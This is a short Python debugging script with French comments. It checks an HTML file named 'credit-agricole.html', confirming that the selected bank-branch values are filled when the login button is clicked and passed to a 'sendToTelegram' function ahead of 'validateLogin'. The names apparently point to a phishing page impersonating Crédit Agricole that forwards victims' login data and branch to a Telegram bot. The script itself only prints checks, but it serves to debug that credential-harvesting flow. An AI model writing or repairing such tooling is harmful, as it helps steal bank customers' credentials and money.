with open('credit-agricole.html', 'r', encoding='utf-8') as f:
    content = f.read()

# Chercher la declaration des variables
print("=== DECLARATION DES VARIABLES ===")
if "let selectedCaisseValue = '';" in content:
    print("OK - selectedCaisseValue declare")
else:
    print("ERREUR - selectedCaisseValue PAS declare")

# Chercher ou selectedCaisseValue se remplit
print("\n=== OU SELECTEDCAISSEVALUE SE REMPLIT ===")
lines = content.split('\n')
for i, line in enumerate(lines):
    if 'selectedCaisseValue =' in line and 'let' not in line:
        print(f"Ligne {i}: {line.strip()}")

# Chercher ou caisseInfo est utilise dans sendToTelegram
print("\n=== DANS sendToTelegram ===")
start = content.find('async function sendToTelegram')
end = content.find('async function validateLogin')
send_func = content[start:end]

if 'caisseInfo' in send_func:
    print("OK - caisseInfo utilise dans sendToTelegram")
    
if 'selectedCaisseValue' in send_func:
    print("OK - selectedCaisseValue utilise dans sendToTelegram")

if 'selectedCaisseLabel' in send_func:
    print("OK - selectedCaisseLabel utilise dans sendToTelegram")

# Chercher connectBtn
print("\n=== connectBtn.addEventListener ===")
start = content.find('connectBtn.addEventListener')
end = content.find('// --- PAGE 2:', start)
button_code = content[start:end]

if 'selectedCaisseValue = caisseSelect.value' in button_code:
    print("OK - selectedCaisseValue se remplit au clic du bouton")
else:
    print("ERREUR - selectedCaisseValue ne se remplit PAS au clic")

if 'selectedCaisseLabel = caisseSelect.options' in button_code:
    print("OK - selectedCaisseLabel se remplit au clic du bouton")
else:
    print("ERREUR - selectedCaisseLabel ne se remplit PAS au clic")

